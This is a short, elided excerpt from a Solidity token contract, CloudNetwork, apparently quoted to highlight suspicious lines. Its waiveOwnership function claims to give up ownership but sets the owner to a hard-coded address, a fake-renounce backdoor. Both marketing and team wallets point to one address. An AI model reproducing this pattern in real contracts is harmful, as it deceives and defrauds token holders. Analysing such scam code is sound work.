...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x9c09d88404aAF89AdD8Cf5E8997F33093a2C353a);
    }
...
contract CloudNetwork is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xAfF3D2816FAEEcfd8dBfa212ae24F6D6026de4C9);
    address payable public teamWalletAddress = payable(0xAfF3D2816FAEEcfd8dBfa212ae24F6D6026de4C9);
